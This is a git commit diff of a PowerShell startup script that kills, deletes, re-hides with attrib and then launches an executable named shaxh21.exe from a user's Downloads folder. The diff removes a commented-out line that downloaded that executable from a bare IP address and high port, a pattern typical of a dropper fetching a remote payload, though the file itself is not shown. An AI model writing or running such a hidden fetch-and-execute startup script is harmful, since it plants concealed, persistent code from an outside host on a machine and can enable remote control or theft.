88618486a94bec62065d1013603989dd769dd7c9
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-27 01:40:09 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,7 +1,7 @@
 taskkill /F /IM shaxh21.exe
 attrib -h C:\Users\seba\downloads\shaxh21.exe
 del C:\Users\seba\downloads\shaxh21.exe
-#Invoke-WebRequest -Uri http://193.161.193.99:56673/shaxh21.exe -OutFile C:\Users\seba\Downloads\shaxh21.exe
+#56673shaxh21.exe
 attrib +h C:\Users\seba\downloads\shaxh21.exe
 C:\Users\seba\downloads\shaxh21.exe
 
